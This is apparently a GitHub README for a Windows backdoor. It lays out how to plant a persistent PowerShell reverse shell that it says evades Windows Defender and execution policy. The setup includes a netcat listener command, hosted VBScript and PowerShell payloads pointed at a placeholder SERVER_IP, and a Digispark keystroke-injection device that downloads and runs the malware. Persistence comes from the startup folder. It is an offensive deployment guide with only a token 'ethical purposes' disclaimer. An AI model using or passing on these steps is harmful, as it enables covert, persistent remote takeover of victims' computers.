# Backdoor using reverse shell on a Windows computer
This reverse shell bypass Windows Defender with all security activated, bypass Powershell's Execution-Policy.<br>
<b>Use it only for ethical purposes.</b><br>

# Get Started
This attack allow the hacker to get full control of the target computer remotely.<br>
<h3>Requirements :</h3>
<ul>
  <li>A Server in listening mode.</li>
  <li>A method to get the software installed on the target (like keystroke injection, social engineering, ...).</li>
</ul>
<h3>Setting up :</h3>
For my part, I will use keystroke injection thanks to a microcontroller like Digispark, Arduino, or other. This microcontroller is used as a virtual keyboard, typing automatically.<br>
<br>
<b>To set up, follow these steps :</b>
<ol>
  <li>
      On your server, listen on a specific port to intercept the reverse shell sent by the malware installed on the target.<br>
      For example on linux, I will listen on the port 553 with netcat with the following command : <code>nc -nvlp 553</code>
  </li>
  <li>
      Host the <a href="https://github.com/damien-grau/windows_backdoor/blob/main/s.vbs">VBScript</a> and the <a href="https://github.com/damien-grau/windows_backdoor/blob/main/reverse_shell.ps1">PowerShell script</a> on your server separately, accessible over the WAN.<br>
      In the <a href="https://github.com/damien-grau/windows_backdoor/blob/main/s.vbs">VBScript</a>, you must specify the IP of your server < SERVER_IP >, and the port < SERVER_PORT > on which your PowerShell script is hosted.<br>
      In the <a href="https://github.com/damien-grau/windows_backdoor/blob/main/reverse_shell.ps1">PowerShell script</a>, you must specify the IP of your server in < SERVER_IP >, and the port < SERVER_PORT > on which you will listen to intercept the reverse             shell.
  </li>
  <li>
      Program your microcontroller to download the malware on the target computer by sending keystrokes. <br>
      An example is in "digispark_autoprompt/digispark_auoprompt.ino", but you must change the WebRequest to the URL where your VBScript is hosted. This example opens         the execution dialog with the shortcut "Windows+R", and executes the command to download and execute the malware.
  </li>
  <li>
      The malware is now installed on the target computer and stored in the Windows startup folder. This means that every time the target logs in to its Windows session, a connection will be established to your server provided it is listening
  </li>
</ol>

<h1>The whole process in a sequence diagram</h1>
<img src="https://user-images.githubusercontent.com/100437527/231558795-49b59b0b-1eea-4330-a2fa-5b9ac0d93982.png">
<h1>References</h1>
<ul>
  <li><a href="https://startingelectronics.org/tutorials/arduino/digispark/digispark-windows-setup/">Digispark Setup in Windows 10</a></li>
  <li><a href="https://linuxhint.com/setup-apache-virtual-hosts-on-ubuntu-22-04/">Apache Virtual Host Setup</a></li>
  <li><a href="https://www.ebay.com/itm/173455563728">Bad USB Arduino Leonardo</a></li>
  <li><a href="https://reference.arduino.cc/reference/en/language/functions/usb/keyboard/">Keyboard Library for Arduino</a></li>
</ul>
